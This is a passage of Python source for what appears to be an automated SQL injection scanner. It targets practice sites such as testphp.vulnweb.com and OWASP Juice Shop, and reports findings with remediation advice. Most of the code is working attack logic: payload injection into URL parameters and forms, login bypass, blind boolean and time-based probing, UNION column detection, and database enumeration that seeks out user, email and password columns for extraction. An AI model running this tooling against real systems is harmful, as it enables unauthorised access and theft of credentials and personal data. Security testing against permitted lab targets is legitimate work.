        """Scan testphp.vulnweb.com for SQL injection vulnerabilities"""
        vulnerabilities = []
        db_info = None
        
        # Known vulnerable endpoints on vulnweb
        vulnerable_endpoints = [
            {"url": f"{base_url}/listproducts.php", "param": "cat", "method": "GET"},
            {"url": f"{base_url}/artists.php", "param": "artist", "method": "GET"},
            {"url": f"{base_url}/showimage.php", "param": "file", "method": "GET"},
            {"url": f"{base_url}/product.php", "param": "pic", "method": "GET"},
        ]
        
        for endpoint in vulnerable_endpoints:
            self._log(f"[*] Testing {endpoint['url']}...")
            
            for payload_info in self._get_error_based_payloads()[:10]:
                try:
                    page = await self._context.new_page()
                    test_url = f"{endpoint['url']}?{endpoint['param']}=1{payload_info['payload']}"
                    
                    http_msg = HTTPMessage()
                    http_msg.method = "GET"
                    http_msg.url = test_url
                    
                    start_time = time.time()
                    response = await page.goto(test_url, wait_until='networkidle', timeout=15000)
                    http_msg.response_time_ms = (time.time() - start_time) * 1000
                    
                    content = await page.content()
                    http_msg.response_body = content
                    http_msg.status_code = response.status if response else 0
                    if response:
                        http_msg.response_headers = dict(response.headers)
                    
                    await page.close()
                    
                    sqli_result = self._detect_sqli_in_response(content, response.status if response else 0)
                    
                    if sqli_result.vulnerable:
                        self._log(f"  [+] SQLi FOUND: {sqli_result.injection_type}")
                        self._log(f"      Database: {sqli_result.database_type.value}")
                        
                        vuln = self.create_vulnerability(
                            http_capture=http_msg,
                            vuln_type=f"SQL Injection ({sqli_result.injection_type})",
                            severity=Severity.CRITICAL,
                            url=endpoint["url"],
                            parameter=endpoint["param"],
                            payload=payload_info["payload"],
                            evidence=sqli_result.evidence[:500],
                            description=self._get_sqli_description(sqli_result),
                            cwe_id="CWE-89",
                            cvss_score=9.8,
                            remediation=self._get_remediation(),
                            references=self._get_references()
                        )
                        vulnerabilities.append(vuln)
                        
                        if not db_info:
                            db_info = DatabaseInfo(db_type=sqli_result.database_type)
                        break
                        
                except Exception as e:
                    continue
                
                await asyncio.sleep(0.2)
        
        # ═══════════════════════════════════════════════════════════════
        # Test login page authentication bypass
        # ═══════════════════════════════════════════════════════════════
        self._log("[*] Testing VulnWeb login bypass...")
        
        login_url = f"{base_url}/login.php"
        
        for bypass in self._get_auth_bypass_payloads():
            try:
                page = await self._context.new_page()
                await page.goto(login_url, wait_until='networkidle', timeout=10000)
                
                # Fill login form
                try:
                    await page.fill('input[name="uname"]', bypass["username"])
                    await page.fill('input[name="pass"]', bypass["password"])
                except:
                    await page.close()
                    continue
                
                http_msg = HTTPMessage()
                http_msg.method = "POST"
                http_msg.url = login_url
                http_msg.request_body = f"uname={quote(bypass['username'])}&pass={quote(bypass['password'])}"
                
                # Submit
                start_time = time.time()
                await page.click('input[type="submit"]')
                await page.wait_for_timeout(2000)
                http_msg.response_time_ms = (time.time() - start_time) * 1000
                
                content = await page.content()
                current_url = page.url
                http_msg.response_body = content
                
                await page.close()
                
                # Check for successful bypass
                if "logout" in content.lower() or "welcome" in content.lower() or "userinfo" in current_url:
                    self._log(f"  [+] AUTH BYPASS FOUND: {bypass['type']}")
                    
                    vuln = self.create_vulnerability(
                        http_capture=http_msg,
                        vuln_type="SQL Injection (Authentication Bypass)",
                        severity=Severity.CRITICAL,
                        url=login_url,
                        parameter="uname",
                        payload=bypass["username"],
                        evidence="Login bypassed successfully - redirected to user area",
                        description="Authentication bypass via SQL injection allows login without valid credentials.",
                        cwe_id="CWE-89",
                        cvss_score=9.8,
                        remediation=self._get_remediation(),
                        references=self._get_references()
                    )
                    vulnerabilities.append(vuln)
                    break
                    
            except Exception as e:
                continue
            
            await asyncio.sleep(0.3)
        
        # ═══════════════════════════════════════════════════════════════
        # Attempt UNION-based data extraction
        # ═══════════════════════════════════════════════════════════════
        if vulnerabilities and not db_info:
            best_vuln = vulnerabilities[0]
            num_cols = await self._detect_union_columns(
                f"{best_vuln.url}?{best_vuln.parameter}=1",
                best_vuln.parameter
            )
            
            if num_cols:
                self._log(f"  [+] Detected {num_cols} columns")
                db_type = self._get_db_type_from_vuln(best_vuln)
                
                db_info = await self._enumerate_database(
                    best_vuln.url,
                    best_vuln.parameter,
                    db_type,
                    None,
                    num_cols
                )
        
        return vulnerabilities, db_info
    
    # ═══════════════════════════════════════════════════════════════════════════
    # GENERIC TESTING METHODS
    # ═══════════════════════════════════════════════════════════════════════════
    
    async def _test_url_params(
        self, 
        url: str, 
        auth_token: Optional[str]
    ) -> List[Vulnerability]:
        """Test URL parameters for SQL injection"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        for param_name in params.keys():
            # Skip if already tested
            test_key = f"{parsed.path}:{param_name}"
            if test_key in self._tested:
                continue
            self._tested.add(test_key)
            
            self._log(f"  [*] Testing parameter: {param_name}")
            
            # Test error-based SQLi
            for payload_info in self._get_error_based_payloads()[:8]:
                result = await self._test_single_payload(
                    url, param_name, payload_info["payload"], auth_token
                )
                
                if result.vulnerable:
                    vuln = self.create_vulnerability(
                        http_capture=result.http_message,
                        vuln_type=f"SQL Injection ({result.injection_type})",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload_info["payload"],
                        evidence=result.evidence[:500],
                        description=self._get_sqli_description(result),
                        cwe_id="CWE-89",
                        cvss_score=8.6,
                        remediation=self._get_remediation(),
                        references=self._get_references()
                    )
                    vulnerabilities.append(vuln)
                    self._found_sqli.add(test_key)
                    break
                
                await asyncio.sleep(0.2)
            
            # Test boolean-based if no error-based found
            if test_key not in self._found_sqli:
                bool_result = await self._test_boolean_based(url, param_name, auth_token)
                if bool_result.vulnerable:
                    vuln = self.create_vulnerability(
                        http_capture=bool_result.http_message,
                        vuln_type="SQL Injection (Boolean-based Blind)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=bool_result.payload,
                        evidence=bool_result.evidence,
                        description="Boolean-based blind SQL injection detected through response difference analysis.",
                        cwe_id="CWE-89",
                        cvss_score=8.6,
                        remediation=self._get_remediation(),
                        references=self._get_references()
                    )
                    vulnerabilities.append(vuln)
                    self._found_sqli.add(test_key)
            
            # Test time-based if still nothing found
            if test_key not in self._found_sqli:
                time_result = await self._test_time_based(url, param_name, auth_token)
                if time_result.vulnerable:
                    vuln = self.create_vulnerability(
                        http_capture=time_result.http_message,
                        vuln_type="SQL Injection (Time-based Blind)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=time_result.payload,
                        evidence=time_result.evidence,
                        description=f"Time-based blind SQL injection detected. Database type: {time_result.database_type.value}",
                        cwe_id="CWE-89",
                        cvss_score=8.6,
                        remediation=self._get_remediation(),
                        references=self._get_references()
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_form(
        self, 
        form: Dict, 
        auth_token: Optional[str]
    ) -> List[Vulnerability]:
        """Test form inputs for SQL injection"""
        vulnerabilities = []
        
        action = form.get("action", "")
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])
        
        for input_field in inputs:
            input_name = input_field.get("name")
            input_type = input_field.get("type", "text")
            
            if not input_name or input_type in ["hidden", "submit", "button", "file"]:
                continue
            
            self._log(f"  [*] Testing form input: {input_name}")
            
            for payload_info in self._get_error_based_payloads()[:6]:
                result = await self._test_form_input(
                    action, method, inputs, input_name, 
                    payload_info["payload"], auth_token
                )
                
                if result.vulnerable:
                    vuln = self.create_vulnerability(
                        http_capture=result.http_message,
                        vuln_type=f"SQL Injection ({result.injection_type})",
                        severity=Severity.HIGH,
                        url=action,
                        parameter=input_name,
                        payload=payload_info["payload"],
                        evidence=result.evidence[:500],
                        description=f"SQL injection in form input. Method: {method}",
                        cwe_id="CWE-89",
                        cvss_score=8.6,
                        remediation=self._get_remediation(),
                        references=self._get_references()
                    )
                    vulnerabilities.append(vuln)
                    break
                
                await asyncio.sleep(0.2)
        
        return vulnerabilities
    
    async def _test_single_payload(
        self,
        url: str,
        param_name: str,
        payload: str,
        auth_token: Optional[str]
    ) -> SQLiResult:
        """Test a single SQLi payload against a parameter"""
        result = SQLiResult()
        
        page = await self._context.new_page()
        
        try:
            test_url = self._inject_payload_in_url(url, param_name, f"1{payload}")
            
            http_msg = HTTPMessage()
            http_msg.method = "GET"
            http_msg.url = test_url
            
            if auth_token:
                await page.evaluate(f'() => localStorage.setItem("token", "{auth_token}")')
            
            start_time = time.time()
            response = await page.goto(test_url, wait_until='networkidle', timeout=15000)
            http_msg.response_time_ms = (time.time() - start_time) * 1000
            
            content = await page.content()
            http_msg.response_body = content
            http_msg.status_code = response.status if response else 0
            
            result = self._detect_sqli_in_response(content, response.status if response else 0)
            result.payload = payload
            result.http_message = http_msg
            
        except Exception as e:
            pass
        finally:
            await page.close()
        
        return result
    
    async def _test_form_input(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        target_input: str,
        payload: str,
        auth_token: Optional[str]
    ) -> SQLiResult:
        """Test a form input for SQL injection"""
        result = SQLiResult()
        
        page = await self._context.new_page()
        
        try:
            if auth_token:
                base_url = action.rsplit('/', 1)[0]
                await page.goto(base_url, wait_until='domcontentloaded', timeout=10000)
                await page.evaluate(f'() => localStorage.setItem("token", "{auth_token}")')
            
            await page.goto(action, wait_until='networkidle', timeout=10000)
            
            http_msg = HTTPMessage()
            http_msg.method = method
            http_msg.url = action
            
            form_data = {}
            
            # Fill form fields
            for input_field in inputs:
                input_name = input_field.get("name")
                if not input_name:
                    continue
                
                value = payload if input_name == target_input else "test123"
                form_data[input_name] = value
                
                try:
                    selectors = [
                        f'input[name="{input_name}"]',
                        f'textarea[name="{input_name}"]',
                        f'#{input_name}',
                    ]
                    
                    for selector in selectors:
                        elem = page.locator(selector).first
                        if await elem.count() > 0:
                            await elem.fill(value)
                            break
                except:
                    continue
            
            http_msg.request_body = urlencode(form_data)
            
            # Submit form
            start_time = time.time()
            try:
                async with page.expect_navigation(timeout=10000):
                    await page.click('button[type="submit"], input[type="submit"]')
            except:
                await page.keyboard.press('Enter')
                await page.wait_for_timeout(3000)
            
            http_msg.response_time_ms = (time.time() - start_time) * 1000
            
            content = await page.content()
            http_msg.response_body = content
            
            result = self._detect_sqli_in_response(content, 200)
            result.payload = payload
            result.http_message = http_msg
            
        except Exception as e:
            pass
        finally:
            await page.close()
        
        return result
    
    async def _test_boolean_based(
        self,
        url: str,
        param_name: str,
        auth_token: Optional[str]
    ) -> SQLiResult:
        """Test for boolean-based blind SQL injection"""
        result = SQLiResult()
        
        for true_payload, false_payload in self._get_boolean_based_payloads()[:5]:
            try:
                page = await self._context.new_page()
                
                if auth_token:
                    await page.evaluate(f'() => localStorage.setItem("token", "{auth_token}")')
                
                # Test TRUE condition
                true_url = self._inject_payload_in_url(url, param_name, f"1{true_payload}")
                await page.goto(true_url, wait_until='networkidle', timeout=10000)
                true_content = await page.content()
                true_length = len(true_content)
                
                # Test FALSE condition
                false_url = self._inject_payload_in_url(url, param_name, f"1{false_payload}")
                await page.goto(false_url, wait_until='networkidle', timeout=10000)
                false_content = await page.content()
                false_length = len(false_content)
                
                await page.close()
                
                # Significant difference indicates boolean SQLi
                diff_ratio = abs(true_length - false_length) / max(true_length, false_length, 1)
                
                if diff_ratio > 0.1:  # More than 10% difference
                    result.vulnerable = True
                    result.injection_type = "Boolean-based Blind"
                    result.payload = true_payload
                    result.evidence = f"Response length difference: {true_length} vs {false_length} ({diff_ratio:.1%})"
                    
                    # Create HTTP message for the TRUE payload
                    http_msg = HTTPMessage()
                    http_msg.method = "GET"
                    http_msg.url = true_url
                    http_msg.response_body = true_content[:2000]
                    result.http_message = http_msg
                    
                    return result
                    
            except Exception:
                continue
            
            await asyncio.sleep(0.3)
        
        return result
    
    async def _test_time_based(
        self,
        url: str,
        param_name: str,
        auth_token: Optional[str]
    ) -> SQLiResult:
        """Test for time-based blind SQL injection"""
        result = SQLiResult()
        
        # Get baseline response time
        page = await self._context.new_page()
        try:
            start = time.time()
            await page.goto(url, wait_until='networkidle', timeout=15000)
            baseline_time = time.time() - start
            await page.close()
        except:
            await page.close()
            return result
        
        for payload_info in self._get_time_based_payloads()[:6]:
            try:
                page = await self._context.new_page()
                
                if auth_token:
                    await page.evaluate(f'() => localStorage.setItem("token", "{auth_token}")')
                
                test_url = self._inject_payload_in_url(url, param_name, f"1{payload_info['payload']}")
                
                start = time.time()
                await page.goto(test_url, wait_until='networkidle', timeout=30000)
                response_time = time.time() - start
                
                content = await page.content()
                await page.close()
                
                expected_delay = payload_info["delay"]
                
                # Check if response was delayed
                if response_time >= (baseline_time + expected_delay - 1):
                    result.vulnerable = True
                    result.injection_type = "Time-based Blind"
                    result.database_type = payload_info["db"]
                    result.payload = payload_info["payload"]
                    result.evidence = f"Response delayed by {response_time - baseline_time:.1f}s (baseline: {baseline_time:.1f}s, expected delay: {expected_delay}s)"
                    
                    http_msg = HTTPMessage()
                    http_msg.method = "GET"
                    http_msg.url = test_url
                    http_msg.response_time_ms = response_time * 1000
                    http_msg.response_body = content[:1000]
                    result.http_message = http_msg
                    
                    return result
                    
            except Exception:
                continue
            
            await asyncio.sleep(0.5)
        
        return result
    
    # ═══════════════════════════════════════════════════════════════════════════
    # DATABASE ENUMERATION
    # ═══════════════════════════════════════════════════════════════════════════
    
    async def _detect_union_columns(
        self,
        base_url: str,
        param_name: str,
        max_cols: int = 20
    ) -> Optional[int]:
        """Detect the number of columns for UNION-based injection"""
        
        for num_cols in range(1, max_cols + 1):
            nulls = ",".join(["NULL"] * num_cols)
            
            payloads = [
                f"' UNION SELECT {nulls}--",
                f"' UNION SELECT {nulls}#",
                f"' UNION ALL SELECT {nulls}--",
                f" UNION SELECT {nulls}--",
            ]
            
            for payload in payloads:
                try:
                    page = await self._context.new_page()
                    test_url = self._inject_payload_in_url(base_url, param_name, f"-1{payload}")
                    
                    response = await page.goto(test_url, wait_until='networkidle', timeout=10000)
                    content = await page.content()
                    
                    await page.close()
                    
                    has_error = self._has_sql_error(content)
                    
                    if not has_error and response and response.status == 200:
                        # Verify by checking num_cols + 1 causes error
                        verify_nulls = ",".join(["NULL"] * (num_cols + 1))
                        verify_payload = f"' UNION SELECT {verify_nulls}--"
                        
                        page = await self._context.new_page()
                        verify_url = self._inject_payload_in_url(base_url, param_name, f"-1{verify_payload}")
                        await page.goto(verify_url, wait_until='networkidle', timeout=10000)
                        verify_content = await page.content()
                        await page.close()
                        
                        if self._has_sql_error(verify_content):
                            return num_cols
                            
                except Exception:
                    continue
                
                await asyncio.sleep(0.1)
        
        return None
    
    async def _enumerate_database(
        self,
        url: str,
        param_name: str,
        db_type: DatabaseType,
        auth_token: Optional[str],
        num_cols: int = None
    ) -> Optional[DatabaseInfo]:
        """Enumerate database structure and extract data"""
        
        db_info = DatabaseInfo(db_type=db_type)
        
        enum_payloads = self._get_db_enum_payloads(db_type)
        
        if not enum_payloads:
            return db_info
        
        if not num_cols:
            num_cols = await self._detect_union_columns(
                f"{url}?{param_name}=1", 
                param_name
            )
        
        if not num_cols:
            self._log("  [!] Could not detect number of columns for UNION injection")
            return db_info
        
        self._log(f"  [+] Using {num_cols} columns for UNION injection")
        
        # Extract version
        if "version" in enum_payloads:
            for payload_template in enum_payloads["version"]:
                version = await self._extract_union_value(url, param_name, payload_template, num_cols)
                if version:
                    db_info.version = version
                    self._log(f"  [+] Database version: {version}")
                    break
        
        # Extract tables
        if "tables" in enum_payloads:
            self._log("  [*] Extracting table names...")
            for payload_template in enum_payloads["tables"]:
                tables = await self._extract_union_values(url, param_name, payload_template, num_cols)
                if tables:
                    db_info.tables = tables[:50]
                    self._log(f"  [+] Found {len(tables)} tables: {', '.join(tables[:10])}...")
                    break
        
        # Extract columns for interesting tables
        interesting_tables = ["users", "user", "accounts", "admin", "members", 
                            "login", "credentials", "customers", "products"]
        
        tables_to_enum = [t for t in db_info.tables if t.lower() in interesting_tables][:5]
        
        if not tables_to_enum and db_info.tables:
            tables_to_enum = db_info.tables[:3]
        
        if "columns" in enum_payloads:
            for table in tables_to_enum:
                self._log(f"  [*] Extracting columns from '{table}'...")
                for payload_template in enum_payloads["columns"]:
                    payload = payload_template.replace("{table}", table)
                    columns = await self._extract_union_values(url, param_name, payload, num_cols)
                    if columns:
                        db_info.columns[table] = columns
                        self._log(f"      Columns: {', '.join(columns[:10])}")
                        break
        
        # Extract data from user tables
        if "data" in enum_payloads:
            for table in tables_to_enum:
                if table not in db_info.columns:
                    continue
                
                columns = db_info.columns[table]
                
                # Look for interesting columns
                interesting_cols = [c for c in columns if any(
                    x in c.lower() for x in ["user", "name", "email", "pass", "pwd", "login", "admin"]
                )]
                
                cols_to_extract = interesting_cols[:3] if interesting_cols else columns[:3]
                
                self._log(f"  [*] Extracting data from '{table}' ({', '.join(cols_to_extract)})...")
                
                for payload_template in enum_payloads["data"]:
                    cols_str = ",".join(cols_to_extract)
                    payload = payload_template.replace("{table}", table).replace("{columns}", cols_str)
                    
                    data = await self._extract_union_data(url, param_name, payload, num_cols, cols_to_extract)
                    if data:
                        db_info.extracted_data[table] = data
                        self._log(f"      Extracted {len(data)} rows")
                        for row in data[:3]:
                            self._log(f"        {row}")
                        break
        
        return db_info
    
    async def _extract_union_value(
        self,
        url: str,
        param_name: str,
        payload_template: str,
        num_cols: int
    ) -> Optional[str]:
        """Extract a single value using UNION injection"""
        
        for col_pos in range(1, num_cols + 1):
            columns = []
            for i in range(1, num_cols + 1):
                if i == col_pos:
                    match = re.search(r"SELECT\s+(.+?)(?:--|#|$)", payload_template, re.IGNORECASE)
                    if match:
                        columns.append(match.group(1).strip())
                    else:
                        columns.append("NULL")
                else:
                    columns.append("NULL")
            
            payload = f"' UNION SELECT {','.join(columns)}--"
            
            try:
                page = await self._context.new_page()
                test_url = self._inject_payload_in_url(url, param_name, f"-1{payload}")
                
                await page.goto(test_url, wait_until='networkidle', timeout=10000)
                content = await page.content()
                
                await page.close()
                
                extracted = self._extract_value_from_response(content)
                if extracted:
                    return extracted
                    
            except Exception:
                continue
        
        return None
    
    async def _extract_union_values(
        self,
        url: str,
        param_name: str,
        payload_template: str,
        num_cols: int
    ) -> List[str]:
        """Extract multiple values using UNION injection"""
        values = []
        
        for col_pos in range(1, min(num_cols + 1, 4)):
            columns = []
            for i in range(1, num_cols + 1):
                if i == col_pos:
                    match = re.search(r"SELECT\s+(.+?)(?:\s+FROM|--|#|$)", payload_template, re.IGNORECASE)
                    if match:
                        columns.append(match.group(1).strip())
                    else:
                        columns.append("NULL")
                else:
                    columns.append("NULL")
            
            # Extract FROM clause if present
            from_match = re.search(r"FROM\s+(.+?)(?:--|#|$)", payload_template, re.IGNORECASE)
            from_clause = f" FROM {from_match.group(1).strip()}" if from_match else ""
            
            payload = f"' UNION SELECT {','.join(columns)}{from_clause}--"
            
            try:
                page = await self._context.new_page()
                test_url = self._inject_payload_in_url(url, param_name, f"-1{payload}")
                
                await page.goto(test_url, wait_until='networkidle', timeout=10000)
                content = await page.content()
                
                await page.close()
                
                # Parse multiple values from response
                extracted = self._extract_multiple_values_from_response(content)
                if extracted:
                    values.extend(extracted)
                    if len(values) >= 3:
                        break
                        
            except Exception:
                continue
        
        return list(set(values))  # Remove duplicates
    
    async def _extract_union_data(
        self,
        url: str,
        param_name: str,
        payload_template: str,
        num_cols: int,
        column_names: List[str]
    ) -> List[Dict]:
        """Extract row data using UNION injection"""
        rows = []
        
        # Build CONCAT payload for multiple columns
        if len(column_names) > 1:
            # MySQL style
            concat_expr = f"CONCAT_WS(0x3a,{','.join(column_names)})"
        else:
            concat_expr = column_names[0]
        
        for col_pos in range(1, min(num_cols + 1, 4)):
            columns = []
            for i in range(1, num_cols + 1):
                if i == col_pos:
                    columns.append(concat_expr)
                else:
                    columns.append("NULL")
            
            from_match = re.search(r"FROM\s+(\w+)", payload_template, re.IGNORECASE)
            from_clause = f" FROM {from_match.group(1)}" if from_match else ""
            
            payload = f"' UNION SELECT {','.join(columns)}{from_clause} LIMIT 10--"
            
            try:
                page = await self._context.new_page()
                test_url = self._inject_payload_in_url(url, param_name, f"-1{payload}")
                
                await page.goto(test_url, wait_until='networkidle', timeout=10000)
                content = await page.content()
                
                await page.close()
                
                # Parse colon-separated values
                extracted = self._extract_concatenated_values(content, column_names)
                if extracted:
                    rows.extend(extracted)
                    break
                    
            except Exception:
                continue
        
        return rows
    
    # ═══════════════════════════════════════════════════════════════════════════
    # DETECTION AND PARSING HELPERS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _detect_sqli_in_response(
        self, 
        content: str, 
        status_code: int
    ) -> SQLiResult:
        """Analyze response for SQL injection indicators"""
        result = SQLiResult()
        
        if not content:
            return result
        
        content_lower = content.lower()
        
        # Check for database error messages
        for db_type, patterns in self._db_errors.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    result.vulnerable = True
                    result.injection_type = "Error-based"
                    result.database_type = db_type
                    
                    # Extract error message for evidence
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        # Get surrounding context
                        start = max(0, match.start() - 50)
                        end = min(len(content), match.end() + 100)
                        result.evidence = f"SQL Error detected: ...{content[start:end]}..."
                    else:
                        result.evidence = f"SQL Error pattern matched: {pattern}"
                    
                    return result
        
        # Check for generic SQL error indicators
        generic_errors = [
            r"sql syntax",
            r"syntax error",
            r"unterminated string",
            r"quoted string not properly terminated",
            r"unexpected end of sql",
            r"sql command not properly ended",
            r"invalid query",
            r"query failed",
            r"database error",
            r"db error",
            r"odbc error",
            r"jdbc error",
        ]
        
        for pattern in generic_errors:
            if re.search(pattern, content_lower):
                result.vulnerable = True
                result.injection_type = "Error-based"
                result.database_type = DatabaseType.UNKNOWN
                result.evidence = f"Generic SQL error detected: {pattern}"
                return result
        
        # Check for successful UNION injection indicators
        union_indicators = [
            r"null.*null.*null",  # Multiple NULLs in response
            r"admin.*admin",  # Repeated data
        ]
        
        for pattern in union_indicators:
            if re.search(pattern, content_lower):
                result.vulnerable = True
                result.injection_type = "UNION-based"
                result.database_type = DatabaseType.UNKNOWN
                result.evidence = f"UNION injection indicator: {pattern}"
                return result
        
        return result
    
    def _has_sql_error(self, content: str) -> bool:
        """Quick check if response contains SQL error"""
        if not content:
            return False
        
        content_lower = content.lower()
        
        error_indicators = [
            "sql syntax",
            "syntax error",
            "mysql",
            "sqlite",
            "postgresql",
            "ora-",
            "sql server",
            "unterminated",
            "quoted string",
            "database error",
        ]
        
        return any(indicator in content_lower for indicator in error_indicators)
    
    def _extract_value_from_response(self, content: str) -> Optional[str]:
        """Try to extract a single value from response"""
        if not content:
            return None
        
        # Look for common patterns where extracted data might appear
        patterns = [
            # Version strings
            r"(\d+\.\d+\.\d+[-\w]*)",
            # Database names
            r"database[:\s]+(\w+)",
            # User names
            r"user[:\s]+(\w+@[\w\.]+|\w+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def _extract_multiple_values_from_response(self, content: str) -> List[str]:
        """Extract multiple values from response (e.g., table names)"""
        values = []
        
        if not content:
            return values
        
        # Look for comma-separated values
        csv_pattern = r"([a-zA-Z_][a-zA-Z0-9_]*(?:,[a-zA-Z_][a-zA-Z0-9_]*)+)"
        match = re.search(csv_pattern, content)
        if match:
            values.extend(match.group(1).split(','))
        
        # Look for individual table/column-like names
        name_pattern = r"\b([a-zA-Z_][a-zA-Z0-9_]{2,30})\b"
        
        # Common table names to look for
        common_names = ["users", "user", "accounts", "admin", "products", "orders", 
                       "customers", "members", "login", "passwords", "credentials",
                       "sessions", "tokens", "config", "settings"]
        
        for name in common_names:
            if re.search(rf"\b{name}\b", content, re.IGNORECASE):
                values.append(name)
        
        return list(set(values))
    
    def _extract_concatenated_values(
        self, 
        content: str, 
        column_names: List[str]
    ) -> List[Dict]:
        """Extract colon-separated concatenated values"""
        rows = []
        
        if not content:
            return rows
        
        # Look for colon-separated patterns
        # Pattern: value1:value2:value3
        pattern = r"([^<>\s:]{1,100}(?::[^<>\s:]{0,100}){" + str(len(column_names) - 1) + r"})"
        
        matches = re.findall(pattern, content)
        
        for match in matches[:20]:  # Limit results
            parts = match.split(':')
            if len(parts) == len(column_names):
                row = {}
                for i, col_name in enumerate(column_names):
                    row[col_name] = parts[i]
                rows.append(row)
        
        return rows
    
    # ═══════════════════════════════════════════════════════════════════════════
    # UTILITY METHODS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _inject_payload_in_url(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        params[param_name] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    async def _verify_target(self, url: str, max_retries: int = 3) -> bool:
        """Verify the target is accessible"""
        page = await self._context.new_page()
        
        for attempt in range(max_retries):
            try:
                response = await page.goto(
                    url,
                    wait_until='domcontentloaded',
                    timeout=15000
                )
                
                if response and response.status < 500:
                    await page.close()
                    return True
                
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                else:
                    self._log(f"[!] Cannot reach {url}: {str(e)[:100]}")
        
        await page.close()
        return False
    
    async def _setup_auth(self, base_url: str, auth_token: str):
        """Set up authentication in the browser context"""
        page = await self._context.new_page()
        
        try:
            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_timeout(500)
            
            await page.evaluate(f'''() => {{
                try {{
                    localStorage.setItem("token", "{auth_token}");
                }} catch(e) {{
                    console.log("Could not set localStorage");
                }}
            }}''')
            
            self._log(f"[+] Auth token set in browser context")
            
        except Exception as e:
            self._log(f"[!] Could not set auth token: {e}")
        finally:
            await page.close()
    
    async def _detect_juice_shop(self, base_url: str) -> bool:
        """Detect if target is OWASP Juice Shop"""
        page = await self._context.new_page()
        
        try:
            await page.goto(base_url, wait_until='domcontentloaded', timeout=10000)
            content = await page.content()
            title = await page.title()
            
            await page.close()
            
            indicators = [
                "juice shop" in content.lower(),
                "juice shop" in title.lower(),
                "owasp" in content.lower() and "juice" in content.lower(),
                "/rest/products" in content,
                "ng-app" in content and "juice" in content.lower(),
            ]
            
            return any(indicators)
            
        except Exception:
            await page.close()
            return False
    
    def _get_db_type_from_vuln(self, vuln: Vulnerability) -> DatabaseType:
        """Extract database type from vulnerability evidence"""
        evidence_lower = vuln.evidence.lower() if vuln.evidence else ""
        description_lower = vuln.description.lower() if vuln.description else ""
        combined = evidence_lower + description_lower
        
        if "mysql" in combined or "mariadb" in combined:
            return DatabaseType.MYSQL
        elif "sqlite" in combined:
            return DatabaseType.SQLITE
        elif "postgresql" in combined or "postgres" in combined:
            return DatabaseType.POSTGRESQL
        elif "microsoft" in combined or "mssql" in combined or "sql server" in combined:
            return DatabaseType.MSSQL
        elif "oracle" in combined or "ora-" in combined:
            return DatabaseType.ORACLE
        
        return DatabaseType.UNKNOWN
    
    def _log(self, message: str):
        """Print log message if verbose mode is enabled"""
        if self.verbose:
            print(message)
    
    def _get_sqli_description(self, result: SQLiResult) -> str:
        """Generate detailed description for SQL injection finding"""
        desc = f"SQL Injection vulnerability detected using {result.injection_type} technique. "
        
        if result.database_type != DatabaseType.UNKNOWN:
            desc += f"Database identified as {result.database_type.value}. "
        
        desc += """
An attacker can exploit this vulnerability to:
- Extract sensitive data from the database (usernames, passwords, personal information)
- Modify or delete database records
- Bypass authentication mechanisms
- Potentially execute operating system commands (depending on database configuration)
- Escalate privileges within the application
"""
        return desc
    
    def _get_remediation(self) -> str:
        """Get SQL injection remediation advice"""
        return """
## Remediation Steps

### 1. Use Parameterized Queries (Prepared Statements)
This is the **primary defense** against SQL injection.

**Python (SQLite/MySQL):**
```python
# VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# SECURE
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```
Node.js:

```javascript
// VULNERABLE
db.query(`SELECT * FROM users WHERE id = ${userId}`);

// SECURE
db.query('SELECT * FROM users WHERE id = ?', [userId]);
```
2. Use ORM Libraries
Object-Relational Mappers handle parameterization automatically:
Python: SQLAlchemy, Django ORM
Node.js: Sequelize, TypeORM
Java: Hibernate, JPA
3. Input Validation
Validate input type, length, format, and range
Use allowlists for expected values
Reject unexpected or malformed input
4. Least Privilege
Use database accounts with minimal required permissions
Avoid using 'root' or 'sa' accounts for application connections
Restrict access to sensitive tables and procedures
5. Web Application Firewall (WAF)
Deploy WAF rules to detect/block SQL injection patterns
Use as defense-in-depth, not primary protection
6. Error Handling
Never expose database errors to users
Log detailed errors server-side only
Return generic error messages to clients
"""

    def _get_references(self) -> List[str]:
        """Get reference URLs for SQL injection"""
        return [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html",
        "https://cwe.mitre.org/data/definitions/89.html",
        "https://portswigger.net/web-security/sql-injection",
        ]